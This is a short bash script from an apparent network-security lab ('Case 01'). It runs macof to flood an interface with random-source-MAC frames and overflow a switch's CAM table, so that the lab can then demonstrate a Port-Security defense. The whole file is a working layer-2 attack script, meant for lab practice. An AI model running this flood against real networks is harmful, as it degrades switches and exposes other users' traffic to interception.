#!/bin/bash
# macof-flood.sh — real CAM-table flood (Case 01).
#
# macof spews frames with random source MACs. On the GNS3/Cisco half of the
# lab this fills the switch CAM table and the box degrades to hub mode. Inside
# Docker there is no CAM to fill — the bridge keeps working — so use this to
# (a) practice the exact tool, (b) tee up the Port-Security defense on SW2,
# and (c) demonstrate state churn with `tcpdump` on the same NIC.
#
# Usage:
#   macof-flood.sh eth2          # default 100000 frames, ~1-2 minutes
#   macof-flood.sh eth2 200000
set -u

NIC="${1:?usage: macof-flood.sh <nic> [frames]}"
N="${2:-100000}"

echo "[*] flooding $NIC with $N random-source frames"
macof -i "$NIC" -n "$N"
echo "[*] done (Ctrl+C to stop early)."

echo
echo "[*] sanity: frame counters on the last 3 seconds:"
timeout 3 tcpdump -i "$NIC" -n -c 5000 "ether proto arp" 2>/dev/null \
  | wc -l | awk '{print "  ARP frames captured: " $1}'